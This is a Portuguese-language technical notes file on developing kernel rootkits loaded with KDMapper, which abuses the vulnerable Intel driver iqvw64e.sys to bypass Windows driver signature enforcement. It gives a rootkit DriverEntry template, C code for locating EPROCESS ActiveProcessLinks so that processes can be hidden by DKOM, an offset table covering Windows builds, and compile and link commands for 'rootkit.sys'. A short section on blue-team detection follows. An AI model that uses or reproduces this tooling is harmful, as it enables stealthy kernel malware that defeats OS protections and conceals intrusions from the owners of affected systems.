# KDMapper — Driver Mapping & Kernel Rootkit Development

## O que e KDMapper
KDMapper e um manual mapper de drivers kernel. Explora driver Intel vulneravel (iqvw64e.sys) para mapear .sys diretamente em kernel memory, bypassing driver signature enforcement.

## Comportamento Critico
- **DriverObject = NULL** — KDMapper chama DriverEntry(NULL, NULL)
- **DriverUnload NAO funciona** — driver nao e registrado como servico
- **Sem Device Object** — driver e apenas codigo em kernel space
- **QUALQUER deref de DriverObject = BSOD** (NULL pointer dereference em ring 0)

## DriverEntry NULL-safe (Template)
```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    // KDMapper passes NULL — DO NOT access these
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    
    // Driver logic here (DKOM, hooks, etc.)
    
    return STATUS_SUCCESS;
}
```

## DKOM — Dynamic EPROCESS Offset Detection
```c
// Scan range 0x2D0-0x500 covers ALL known Win10/11/Server builds
// Avoids false positives from timer fields around offset 0x200
for (i = 0x2D0; i < 0x500; i += sizeof(PVOID)) {
    if (*(PHANDLE)((PUCHAR)PsInitialSystemProcess + i) == (HANDLE)4) {
        PLIST_ENTRY apl = (PLIST_ENTRY)((PUCHAR)PsInitialSystemProcess + i + sizeof(PVOID));
        if ((ULONG_PTR)apl->Flink > 0xFFFF800000000000ULL &&
            (ULONG_PTR)apl->Blink > 0xFFFF800000000000ULL &&
            apl->Flink != apl)
            return i + sizeof(PVOID);  // APL offset
    }
}
```

## Known EPROCESS Offsets (x64)
| Build | Version | PID Offset | APL Offset |
|-------|---------|-----------|-----------|
| 14393 | Server 2016 / 1607 | 0x2E8 | 0x2F0 |
| 17763 | Server 2019 / 1809 | 0x2E0 | 0x2E8 |
| 18362-18363 | 1903-1909 | 0x2E8 | 0x2F0 |
| 19041-19045 | 2004-22H2 | 0x440 | 0x448 |
| 20348 | Server 2022 | 0x440 | 0x448 |
| 22000+ | Win11 | 0x440 | 0x448 |

## Build Flags (VS x64 + WDK)
```bat
cl /c /GS- /Zl /kernel /D _AMD64_ /D _WIN64 /I"%WDK_INC%\km" /I"%WDK_INC%\shared" rootkit.c
link /OUT:rootkit.sys /SUBSYSTEM:NATIVE /DRIVER /ENTRY:DriverEntry /NODEFAULTLIB ntoskrnl.lib rootkit.obj
```

## Deteccao (Blue Team)
- KDMapper explora iqvw64e.sys (Intel driver) — monitorar load deste driver
- Driver mapeado NAO aparece em `lsmod`/`driverquery` — apenas analise de memoria
- DKOM detectavel via cross-view detection (comparar ActiveProcessLinks vs handle table vs CSRSS)

## Keywords
kdmapper, driver mapping, DKOM, rootkit, kernel driver, DriverObject NULL, ActiveProcessLinks, EPROCESS, process hiding, manual mapping